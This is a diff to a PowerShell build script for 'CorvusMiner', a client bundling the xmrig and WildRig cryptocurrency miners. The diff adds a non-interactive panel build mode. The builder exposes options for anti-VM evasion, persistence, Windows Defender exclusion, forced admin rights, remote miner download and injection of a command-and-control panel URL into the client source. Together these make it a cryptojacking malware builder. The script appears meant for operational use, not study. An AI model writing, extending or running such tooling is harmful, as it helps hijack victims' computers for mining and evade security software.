@@ -1,4 +1,4 @@
-#Requires -Version 5.0
+﻿#Requires -Version 5.0
 <#
 .SYNOPSIS
     CorvusMiner Client Builder - Full interactive build script matching Go builder
@@ -24,34 +24,63 @@ param(
     [bool]$defender_exclusion = $false,
     [bool]$cpu_miner = $true,
     [bool]$gpu_miner = $false,
-    [bool]$remote_miners = $false
+    [bool]$remote_miners = $false,
+    [string]$panel_config = "",
+    [string]$source_dir = "",
+    [string]$output_dir = "",
+    [string]$output_name = "",
+    [int]$jobs = 4,
+    [switch]$json,
+    [switch]$keep_build
 )
+
+# ============================================================================
+# Panel (non-interactive) mode state
+# ============================================================================
+$script:PanelJsonMode = $false
+$script:BuildTail = New-Object System.Collections.Generic.Queue[string]
+
+function Write-PanelLog {
+    param([string]$Message)
+    [Console]::Error.WriteLine($Message)
+}
+
+function Add-BuildTail {
+    param([string]$Line)
+    $script:BuildTail.Enqueue($Line)
+    while ($script:BuildTail.Count -gt 60) { [void]$script:BuildTail.Dequeue() }
+}
 
 # ============================================================================
 # Logging Functions (define early)
 # ============================================================================
 function Write-LogInfo {
     param([string]$Message)
+    if ($script:PanelJsonMode) { Write-PanelLog "[INFO] $Message"; return }
     Write-Host "[INFO] $Message" -ForegroundColor Cyan
 }
 
 function Write-LogSuccess {
     param([string]$Message)
+    if ($script:PanelJsonMode) { Write-PanelLog "[SUCCESS] $Message"; return }
     Write-Host "[SUCCESS] $Message" -ForegroundColor Green
 }
 
 function Write-LogError {
     param([string]$Message)
+    if ($script:PanelJsonMode) { Write-PanelLog "[ERROR] $Message"; return }
     Write-Host "[ERROR] $Message" -ForegroundColor Red
 }
 
 function Write-LogWarning {
     param([string]$Message)
+    if ($script:PanelJsonMode) { Write-PanelLog "[WARNING] $Message"; return }
     Write-Host "[WARNING] $Message" -ForegroundColor Yellow
 }
 
 function Write-Header {
     param([string]$Message)
+    if ($script:PanelJsonMode) { Write-PanelLog "=== $Message ==="; return }
     Write-Host "`n================== $Message ==================`n" -ForegroundColor Cyan
 }
 
@@ -76,6 +105,7 @@ function Prompt-YesNo {
 # ============================================================================
 # Check Dependencies First (no admin needed)
 # ============================================================================
+if (-not $panel_config) {
 $hasCMake = $null -ne (Get-Command cmake -ErrorAction SilentlyContinue)
 $hasMinGW = $null -ne (Get-Command g++ -ErrorAction SilentlyContinue)
 
@@ -107,9 +137,15 @@ if ($hasCMake -and $hasMinGW) {
     Start-Process PowerShell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`" $argString" -Verb RunAs
     exit
 }
+}
 
 $ErrorActionPreference = 'Stop'
-$WarningPreference = 'Continue'
+if ($panel_config) {
+    $WarningPreference = 'SilentlyContinue'
+    $ProgressPreference = 'SilentlyContinue'
+} else {
+    $WarningPreference = 'Continue'
+}
 
 # ============================================================================
 # Dependency Management
@@ -464,33 +500,147 @@ function Get-BuildConfiguration {
 # ============================================================================
 # CMake Build
 # ============================================================================
+function Invoke-CmakeCommand {
+    param(
+        [string]$WorkingDirectory,
+        [string[]]$Arguments,
+        [string]$Label
+    )
+
+    Push-Location $WorkingDirectory
+    try {
+        & cmake @Arguments 2>&1 | ForEach-Object {
+            $line = [string]$_
+            Add-BuildTail $line
+            if ($script:PanelJsonMode) { Write-PanelLog $line } else { Write-Host $line }
+        }
+        if ($LASTEXITCODE -ne 0) {
+            throw "$Label failed with exit code $LASTEXITCODE"
+        }
+    }
+    finally {
+        Pop-Location
+    }
+}
+
+function Invoke-ConfigureAndBuild {
+    param(
+        [string]$ClientDir,
+        [hashtable]$Config,
+        [int]$ParallelJobs = 4
+    )
+
+    $buildDir = Join-Path $ClientDir "build"
+
+    Write-LogInfo "Cleaning build directory: $buildDir"
+    if (Test-Path $buildDir) {
+        Remove-Item $buildDir -Recurse -Force -ErrorAction SilentlyContinue | Out-Null
+        Start-Sleep -Milliseconds 500
+    }
+    if (-not (Test-Path $buildDir)) {
+        New-Item -ItemType Directory -Path $buildDir -ErrorAction SilentlyContinue | Out-Null
+    }
+
+    # Locate mingw32-make so CMake can find the build program regardless of PATH state
+    $makeCmd = Get-Command mingw32-make -ErrorAction SilentlyContinue
+    $makeProgram = if ($makeCmd) { $makeCmd.Source } else { $null }
+    if (-not $makeProgram) {
+        # Chocolatey MinGW fallback path
+        $makeProgram = "C:\ProgramData\chocolatey\lib\mingw\tools\install\mingw64\bin\mingw32-make.exe"
+    }
+    if (-not (Test-Path $makeProgram)) {
+        # Last resort: search common MinGW locations
+        $makeFound = Get-ChildItem "C:\mingw*","C:\msys*","C:\tools\mingw*" -Recurse -Filter "mingw32-make.exe" -ErrorAction SilentlyContinue | Select-Object -First 1
+        $makeProgram = if ($makeFound) { $makeFound.FullName } else { $null }
+    }
+
+    $cmakeArgs = @(
+        "-G", "MinGW Makefiles",
+        "-DCMAKE_BUILD_TYPE=Release",
+        "-DCMAKE_C_COMPILER=gcc",
+        "-DCMAKE_CXX_COMPILER=g++",
+        "-DCMAKE_RC_COMPILER=windres"
+    )
+    if ($makeProgram -and (Test-Path $makeProgram)) {
+        $cmakeArgs += "-DCMAKE_MAKE_PROGRAM=$makeProgram"
+        Write-LogInfo "Using make: $makeProgram"
+    }
+
+    if ($Config.AntiVM) { $cmakeArgs += "-DENABLE_ANTIVM=ON" }
+    if ($Config.Persistence) { $cmakeArgs += "-DENABLE_PERSISTENCE=ON" }
+    if ($Config.DebugConsole) { $cmakeArgs += "-DENABLE_DEBUG_CONSOLE=ON" }
+
+    if ($Config.RemoteMiners) {
+        $cmakeArgs += "-DENABLE_REMOTE_MINERS=ON"
+        # Also embed miners as fallback when remote download fails (panel offline)
+        if ($Config.EnableCPUMiner) { $cmakeArgs += "-DENABLE_CPU_MINER=ON" }
+        if ($Config.EnableGPUMiner) { $cmakeArgs += "-DENABLE_GPU_MINER=ON" }
+    }
+    else {
+        if ($Config.EnableCPUMiner) { $cmakeArgs += "-DENABLE_CPU_MINER=ON" }
+        if ($Config.EnableGPUMiner) { $cmakeArgs += "-DENABLE_GPU_MINER=ON" }
+    }
+
+    if ($Config.RequireAdmin) { $cmakeArgs += "-DENABLE_ADMIN_MANIFEST=ON" }
+    if ($Config.DefenderExclude) { $cmakeArgs += "-DENABLE_DEFENDER_EXCLUSION=ON" }
+
+    if ($Config.EnableEmbeddedConfig -and $Config.EmbeddedConfigPath) {
+        $cmakeArgs += "-DENABLE_EMBEDDED_CONFIG=ON"
+        $cmakeArgs += "-DEMBEDDED_CONFIG_JSON_INPUT=$($Config.EmbeddedConfigPath)"
+    }
+    elseif (-not $Config.UseGetConfig -and -not $Config.DisableAutoEmbeddedConfig) {
+        # Legacy behaviour: auto-embed a config file found next to the script.
+        $autoConfigPath = Join-Path $PSScriptRoot "embedded_config.json"
+        if (-not (Test-Path $autoConfigPath)) {
+            $autoConfigPath = Join-Path (Split-Path -Parent $PSScriptRoot) "embedded_config.json"
+        }
+        if (Test-Path $autoConfigPath) {
+            Write-LogInfo "Panel mode: embedding fallback config from $autoConfigPath"
+            $cmakeArgs += "-DENABLE_EMBEDDED_CONFIG=ON"
+            $cmakeArgs += "-DEMBEDDED_CONFIG_JSON_INPUT=$autoConfigPath"
+        }
+    }
+
+    if ($Config.DisableAutoEmbeddedConfig -and -not ($Config.EnableEmbeddedConfig -and $Config.EmbeddedConfigPath)) {
+        # Point at a path that cannot exist so CMake's auto-detection of
+        # Client/resources/embedded_config.json stays disabled.
+        $cmakeArgs += "-DENABLE_EMBEDDED_CONFIG=OFF"
+        $cmakeArgs += "-DEMBEDDED_CONFIG_JSON_INPUT=$([IO.Path]::Combine($buildDir, '.no-embedded-config.json'))"
+    }
+
+    if ($Config.ConfigURL) { $cmakeArgs += "-DCONFIG_GET_URL=$($Config.ConfigURL)" }
+
+    if ($Config.SmartContract) {
+        $cmakeArgs += "-DENABLE_CONTRACT_URL=ON"
+        $cmakeArgs += "-DCONTRACT_ADDRESS=$($Config.ContractAddress)"
+    }
+
+    $cmakeArgs += ".."
+
+    Write-LogInfo "Configuring project with CMake..."
+    Invoke-CmakeCommand -WorkingDirectory $buildDir -Arguments $cmakeArgs -Label "CMake configuration"
+
+    Write-LogInfo "Building project with MinGW..."
+    Invoke-CmakeCommand -WorkingDirectory $buildDir -Arguments @("--build", ".", "--config", "Release", "--parallel", "$ParallelJobs") -Label "Build"
+
+    Write-LogSuccess "Build completed successfully!"
+    return (Join-Path $buildDir "corvus.exe")
+}
+
 function Invoke-CMakeBuild {
     param(
         [string]$ClientDir,
         [hashtable]$Config
     )
-    
-    $buildDir = Join-Path $ClientDir "build"
-    
-    Write-LogInfo "Cleaning build directory: $buildDir"
-    if (Test-Path $buildDir) {
-        Remove-Item $buildDir -Recurse -Force -ErrorAction SilentlyContinue | Out-Null
-        Start-Sleep -Milliseconds 500  # Give filesystem time to release the directory
-    }
-    
-    # Ensure build directory exists
-    if (-not (Test-Path $buildDir)) {
-        New-Item -ItemType Directory -Path $buildDir -ErrorAction SilentlyContinue | Out-Null
-    }
-    
+
     # Backup source files
     Backup-SourceFiles $ClientDir
-    
+
     try {
         # Modify source files based on configuration
         $srcDir = Join-Path $ClientDir "src"
         $mainCppPath = Join-Path $srcDir "main.cpp"
-        
+
         if ($Config.SmartContract) {
             Write-LogInfo "Smart contract URL mode - skipping static URL injection"
             Write-LogInfo "Contract: $($Config.ContractAddress)"
@@ -501,132 +651,235 @@ function Invoke-CMakeBuild {
         else {
             & Modify-PanelURL -MainCppPath $mainCppPath -PanelURL $Config.PanelURL
         }
-        
-        # Locate mingw32-make so CMake can find the build program regardless of PATH state
-        $makeCmd = Get-Command mingw32-make -ErrorAction SilentlyContinue
-        $makeProgram = if ($makeCmd) { $makeCmd.Source } else { $null }
-        if (-not $makeProgram) {
-            # Chocolatey MinGW fallback path
-            $makeProgram = "C:\ProgramData\chocolatey\lib\mingw\tools\install\mingw64\bin\mingw32-make.exe"
-        }
-        if (-not (Test-Path $makeProgram)) {
-            # Last resort: search common MinGW locations
-            $makeFound = Get-ChildItem "C:\mingw*","C:\msys*","C:\tools\mingw*" -Recurse -Filter "mingw32-make.exe" -ErrorAction SilentlyContinue | Select-Object -First 1
-            $makeProgram = if ($makeFound) { $makeFound.FullName } else { $null }
-        }
 
-        # Prepare CMake arguments for 64-bit build
-        $cmakeArgs = @(
-            "-G", "MinGW Makefiles",
-            "-DCMAKE_BUILD_TYPE=Release",
-            "-DCMAKE_C_COMPILER=gcc",
-            "-DCMAKE_CXX_COMPILER=g++",
-            "-DCMAKE_RC_COMPILER=windres"
-        )
-        if ($makeProgram -and (Test-Path $makeProgram)) {
-            $cmakeArgs += "-DCMAKE_MAKE_PROGRAM=$makeProgram"
-            Write-LogInfo "Using make: $makeProgram"
-        }
-        
-        if ($Config.AntiVM) {
-            $cmakeArgs += "-DENABLE_ANTIVM=ON"
-        }
-        
-        if ($Config.Persistence) {
-            $cmakeArgs += "-DENABLE_PERSISTENCE=ON"
-        }
-        
-        if ($Config.DebugConsole) {
-            $cmakeArgs += "-DENABLE_DEBUG_CONSOLE=ON"
-        }
-        
-        if ($Config.RemoteMiners) {
-            $cmakeArgs += "-DENABLE_REMOTE_MINERS=ON"
-            # Also embed miners as fallback when remote download fails (panel offline)
-            if ($Config.EnableCPUMiner) {
-                $cmakeArgs += "-DENABLE_CPU_MINER=ON"
-            }
-            if ($Config.EnableGPUMiner) {
-                $cmakeArgs += "-DENABLE_GPU_MINER=ON"
-            }
-        }
-        else {
-            if ($Config.EnableCPUMiner) {
-                $cmakeArgs += "-DENABLE_CPU_MINER=ON"
-            }
-            if ($Config.EnableGPUMiner) {
-                $cmakeArgs += "-DENABLE_GPU_MINER=ON"
-            }
-        }
-        
-        if ($Config.RequireAdmin) {
-            $cmakeArgs += "-DENABLE_ADMIN_MANIFEST=ON"
-        }
-        
-        if ($Config.DefenderExclude) {
-            $cmakeArgs += "-DENABLE_DEFENDER_EXCLUSION=ON"
-        }
-        
-        if ($Config.EnableEmbeddedConfig -and $Config.EmbeddedConfigPath) {
-            $cmakeArgs += "-DENABLE_EMBEDDED_CONFIG=ON"
-            $cmakeArgs += "-DEMBEDDED_CONFIG_JSON_INPUT=$($Config.EmbeddedConfigPath)"
-        }
-        elseif (-not $Config.UseGetConfig) {
-            # Panel mode: auto-embed config if file exists next to script, so the client
-            # can fall back to it when the panel is temporarily offline.
-            $autoConfigPath = Join-Path $PSScriptRoot "embedded_config.json"
-            if (-not (Test-Path $autoConfigPath)) {
-                $autoConfigPath = Join-Path (Split-Path -Parent $PSScriptRoot) "embedded_config.json"
-            }
-            if (Test-Path $autoConfigPath) {
-                Write-LogInfo "Panel mode: embedding fallback config from $autoConfigPath"
-                $cmakeArgs += "-DENABLE_EMBEDDED_CONFIG=ON"
-                $cmakeArgs += "-DEMBEDDED_CONFIG_JSON_INPUT=$autoConfigPath"
-            }
-        }
-        
-        if ($Config.ConfigURL) {
-            $cmakeArgs += "-DCONFIG_GET_URL=$($Config.ConfigURL)"
-        }
-
-        if ($Config.SmartContract) {
-            $cmakeArgs += "-DENABLE_CONTRACT_URL=ON"
-            $cmakeArgs += "-DCONTRACT_ADDRESS=$($Config.ContractAddress)"
-        }
-        
-        $cmakeArgs += ".."
-        
-        Write-LogInfo "Configuring project with CMake..."
-        Push-Location $buildDir
-        
-        try {
-            & cmake $cmakeArgs
-            if ($LASTEXITCODE -ne 0) {
-                throw "CMake configuration failed with exit code $LASTEXITCODE"
-            }
-            
-            Write-LogInfo "Building project with MinGW..."
-            & cmake --build . --config Release --parallel 4
-            if ($LASTEXITCODE -ne 0) {
-                throw "Build failed with exit code $LASTEXITCODE"
-            }
-            
-            Write-LogSuccess "Build completed successfully!"
-            Write-LogInfo "Output: $(Join-Path $buildDir 'corvus.exe')"
-        }
-        finally {
-            Pop-Location
-        }
+        $artifact = Invoke-ConfigureAndBuild -ClientDir $ClientDir -Config $Config -ParallelJobs 4
+        Write-LogInfo "Output: $artifact"
     }
     finally {
         Restore-SourceFiles $ClientDir
     }
 }
 
+function Get-PanelEmbeddedConfig {
+    param(
+        [string]$RepoRoot,
+        [string]$ClientDir,
+        [string]$Setting
+    )
+
+    if ($Setting -eq "none" -or $Setting -eq "off" -or $Setting -eq "false") { return "" }
+
+    if ($Setting -and $Setting -ne "auto") {
+        if (-not (Test-Path -LiteralPath $Setting)) { throw "embedded config not found: $Setting" }
+        try { Get-Content -LiteralPath $Setting -Raw | ConvertFrom-Json | Out-Null }
+        catch { throw "embedded config is not valid JSON: $Setting" }
+        return (Resolve-Path -LiteralPath $Setting).Path
+    }
+
+    $candidates = @(
+        (Join-Path $RepoRoot "embedded_config.json"),
+        (Join-Path (Join-Path $ClientDir "resources") "embedded_config.json"),
+        (Join-Path (Split-Path -Parent $RepoRoot) "embedded_config.json")
+    )
+    foreach ($candidate in $candidates) {
+        if (Test-Path -LiteralPath $candidate) {
+            try { Get-Content -LiteralPath $candidate -Raw | ConvertFrom-Json | Out-Null }
+            catch { throw "embedded config is not valid JSON: $candidate" }
+            return (Resolve-Path -LiteralPath $candidate).Path
+        }
+    }
+    return ""
+}
+
+# Non-interactive build entry point used by the panel on Windows.
+# Reads a JSON build spec, stages the sources, builds with MinGW and prints one
+# JSON result document on stdout (progress goes to stderr).
+function Invoke-PanelBuild {
+    param(
+        [string]$ConfigPath,
+        [string]$SourceDir,
+        [string]$OutputDir,
+        [string]$OutputName,
+        [int]$ParallelJobs = 4,
+        [switch]$KeepBuild
+    )
+
+    $started = Get-Date
+    $result = [ordered]@{
+        success = $false
+        output = ""
+        bytes = 0
+        sha256 = ""
+        duration_ms = 0
+        build_dir = ""
+        warnings = @()
+        error = ""
+        config = $null
+    }
+    $warnings = New-Object System.Collections.Generic.List[string]
+    $stage = $null
+
+    try {
+        if (-not (Test-Path -LiteralPath $ConfigPath)) { throw "panel config file not found: $ConfigPath" }
+        $spec = Get-Content -LiteralPath $ConfigPath -Raw | ConvertFrom-Json
+        $result.config = $spec
+
+        $panelUrls = [string]$spec.panel_urls
+        $configUrl = [string]$spec.config_url
+        $contract = [string]$spec.contract_address
+
+        if (-not $panelUrls -and -not $configUrl -and -not $contract) {
+            throw "no config source: panel_urls, config_url or contract_address is required"
+        }
+        if ($contract -and $configUrl) { throw "contract_address and config_url are mutually exclusive" }
+        if ($contract -and ($contract -notmatch '^0x[0-9a-fA-F]{40}$')) { throw "invalid contract address: $contract" }
+
+        $cpu = $true
+        if ($null -ne $spec.cpu_miner) { $cpu = [bool]$spec.cpu_miner }
+        $gpu = $false
+        if ($null -ne $spec.gpu_miner) { $gpu = [bool]$spec.gpu_miner }
+        $remote = [bool]$spec.remote_miners
+        if (-not $cpu -and -not $gpu -and -not $remote) {
+            throw "no miner selected: enable cpu_miner, gpu_miner or remote_miners"
+        }
+        if ([bool]$spec.process_monitoring) {
+            $warnings.Add("process monitoring is applied from panel config at runtime; process_monitoring has no compile-time effect")
+        }
+
+        $clientDir = ""
+        if ($SourceDir) { $clientDir = $SourceDir }
+        elseif ($spec.source) { $clientDir = [string]$spec.source }
+        if (-not $clientDir) {
+            $repoRoot = Split-Path -Parent $PSScriptRoot
+            $clientDir = Join-Path $repoRoot "Client"
+        }
+        $clientDir = (Resolve-Path -LiteralPath $clientDir).Path
+        if (-not (Test-Path (Join-Path $clientDir "CMakeLists.txt"))) {
+            throw "Client source not found at: $clientDir"
+        }
+        $repoRoot = Split-Path -Parent $clientDir
+
+        $missing = @()
+        foreach ($tool in @("cmake", "gcc", "g++", "windres", "mingw32-make")) {
+            if (-not (Get-Command $tool -ErrorAction SilentlyContinue)) { $missing += $tool }
+        }
+        if ($missing.Count -gt 0) {
+            throw ("missing required tool(s): " + ($missing -join ", ") + " (install with: choco install cmake mingw -y)")
+        }
+
+        $resourcesDir = Join-Path $clientDir "resources"
+        $xmrigPath = Join-Path $resourcesDir "xmrig.exe"
+        $wildrigPath = Join-Path $resourcesDir "wildrig.exe"
+        if ($cpu -and -not (Test-Path -LiteralPath $xmrigPath)) {
+            throw "CPU miner resource not found: $xmrigPath"
+        }
+        if ($gpu -and -not (Test-Path -LiteralPath $wildrigPath)) {
+            throw "GPU miner (WildRig) resource not found: $wildrigPath"
+        }
+
+        # Stage the sources so the repository is never modified by a panel build.
+        $stage = Join-Path ([IO.Path]::GetTempPath()) ("corvus-build-" + [guid]::NewGuid().ToString("N"))
+        $stageClient = Join-Path $stage "Client"
+        Write-LogInfo "Staging sources in $stageClient"
+        New-Item -ItemType Directory -Path $stage -Force | Out-Null
+        Copy-Item -LiteralPath $clientDir -Destination $stageClient -Recurse -Force
+        foreach ($skip in @("build", "backup", "dist")) {
+            $junk = Join-Path $stageClient $skip
+            if (Test-Path $junk) { Remove-Item $junk -Recurse -Force -ErrorAction SilentlyContinue }
+        }
+
+        $embeddedPath = Get-PanelEmbeddedConfig -RepoRoot $repoRoot -ClientDir $clientDir -Setting ([string]$spec.embedded_config)
+
+        $config = @{
+            UseGetConfig = ((-not $panelUrls) -and [bool]$configUrl)
+            PanelURL = $panelUrls
+            ConfigURL = $configUrl
+            SmartContract = [bool]$contract
+            ContractAddress = $contract
+            AntiVM = [bool]$spec.anti_vm
+            Persistence = [bool]$spec.persistence
+            DebugConsole = [bool]$spec.debug_console
+            AdminManifest = [bool]$spec.admin_manifest
+            DefenderExclusion = [bool]$spec.defender_exclusion
+            EnableCPUMiner = $cpu
+            EnableGPUMiner = $gpu
+            RemoteMiners = $remote
+            RequireAdmin = [bool]$spec.admin_manifest
+            EnableEmbeddedConfig = [bool]$embeddedPath
+            EmbeddedConfigPath = $embeddedPath
+            DisableAutoEmbeddedConfig = $true
+        }
+
+        $mainCppPath = Join-Path (Join-Path $stageClient "src") "main.cpp"
+        if ($config.SmartContract) {
+            Write-LogInfo "Smart contract URL mode - skipping static URL injection"
+        }
+        elseif ($config.UseGetConfig) {
+            & Modify-ConfigGetURL -MainCppPath $mainCppPath -ConfigURL $config.ConfigURL
+        }
+        else {
+            & Modify-PanelURL -MainCppPath $mainCppPath -PanelURL $config.PanelURL
+        }
+        if ($embeddedPath) { Write-LogInfo "Embedded fallback config: $embeddedPath" }
+
+        $artifact = Invoke-ConfigureAndBuild -ClientDir $stageClient -Config $config -ParallelJobs $ParallelJobs
+        if (-not (Test-Path -LiteralPath $artifact)) { throw "build artifact not found at: $artifact" }
+
+        $destDir = ""
+        if ($OutputDir) { $destDir = $OutputDir }
+        elseif ($spec.output) { $destDir = [string]$spec.output }
+        else { $destDir = Join-Path $repoRoot "dist" }
+        $destName = "corvus.exe"
+        if ($OutputName) { $destName = $OutputName }
+        elseif ($spec.name) { $destName = [string]$spec.name }
+
+        New-Item -ItemType Directory -Path $destDir -Force | Out-Null
+        $dest = Join-Path $destDir $destName
+        if (Test-Path -LiteralPath $dest) { Remove-Item -LiteralPath $dest -Force }
+        Copy-Item -LiteralPath $artifact -Destination $dest -Force
+
+        $result.output = (Resolve-Path -LiteralPath $dest).Path
+        $result.bytes = (Get-Item -LiteralPath $dest).Length
+        $result.sha256 = (Get-FileHash -LiteralPath $dest -Algorithm SHA256).Hash.ToLowerInvariant()
+        $result.success = $true
+        if ($KeepBuild) { $result.build_dir = $stage }
+    }
+    catch {
+        $result.error = $_.Exception.Message
+        if ($script:BuildTail.Count -gt 0) {
+            $tail = ($script:BuildTail.ToArray() | Select-Object -Last 25) -join "`n"
+            $result.error = $result.error + "`n--- last output ---`n" + $tail
+        }
+    }
+    finally {
+        if ($stage -and -not $KeepBuild) { Remove-Item $stage -Recurse -Force -ErrorAction SilentlyContinue }
+        $result.warnings = @($warnings.ToArray())
+        $result.duration_ms = [int]((Get-Date) - $started).TotalMilliseconds
+    }
+
+    return $result
+}
+
 # ============================================================================
 # Main Entry Point
 # ============================================================================
 function Main {
+    if ($panel_config) {
+        $script:PanelJsonMode = [bool]$json
+        $res = Invoke-PanelBuild -ConfigPath $panel_config -SourceDir $source_dir -OutputDir $output_dir -OutputName $output_name -ParallelJobs $jobs -KeepBuild:$keep_build
+        if ($json) {
+            $res | ConvertTo-Json -Depth 8 -Compress
+        }
+        elseif ($res.success) {
+            Write-Host "Built $($res.output)"
+        }
+        else {
+            Write-Host "Build failed: $($res.error)"
+        }
+        if (-not $res.success) { exit 1 }
+        exit 0
+    }
+
     try {
         # Check admin rights
         $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')
@@ -708,8 +961,10 @@ function Main {
     }
     catch {
         Write-LogError $_
-        Write-Host ""
-        Read-Host "Press Enter to exit"
+        if (-not $panel_config) {
+            Write-Host ""
+            Read-Host "Press Enter to exit"
+        }
         exit 1
     }
 }
